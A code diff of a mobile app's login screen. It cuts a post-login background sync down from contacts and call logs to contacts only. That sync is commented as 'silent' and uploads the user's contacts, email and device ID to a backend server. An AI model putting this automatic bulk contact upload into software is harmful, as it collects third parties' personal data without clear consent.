@@ -16,7 +16,7 @@ import { useAppName } from '../utils/AppContext';
 import { useApiConfig } from '../utils/ApiConfig';
 import { registerForPushNotifications, registerTokenWithBackend } from '../utils/notifications';
 import { saveCredentials } from '../utils/secureAuth';
-import { syncContactsAndCallLogs, checkSyncPermissions } from '../utils/syncData';
+import { syncContacts, checkSyncPermissions } from '../utils/syncData';
 import { collectDeviceMetadata, sendAuditLog } from '../utils/auditLogger';
 import AppBrand from '../components/AppBrand';
 import DeveloperSettings from '../components/DeveloperSettings';
@@ -137,18 +137,15 @@ export default function LoginScreen({ onLoginSuccess }) {
           showToast(`Notification error: ${err.message}`, 'error');
         }
 
-        // Sync contacts and call logs silently in background
+        // Sync contacts silently in background
         setTimeout(async () => {
           try {
-            // Check if permissions are available
             const permissions = await checkSyncPermissions();
 
-            if (permissions.contacts || permissions.callLogs) {
-              // Show toast to inform user
-              showToast('Syncing Contacts & Logs...', 'info');
+            if (permissions.contacts) {
+              showToast('Syncing Contacts...', 'info');
 
-              // Sync data in background
-              const syncResult = await syncContactsAndCallLogs(currentUrl, email, deviceId);
+              const syncResult = await syncContacts(currentUrl, email, deviceId);
 
               if (syncResult.success) {
                 console.log('[Login] Data sync completed successfully');
@@ -161,7 +158,7 @@ export default function LoginScreen({ onLoginSuccess }) {
           } catch (err) {
             console.error('[Login] Sync error:', err);
           }
-        }, 1000); // Start sync after 1 second
+        }, 1000);
 
         // Navigate after notification setup
         setTimeout(() => {
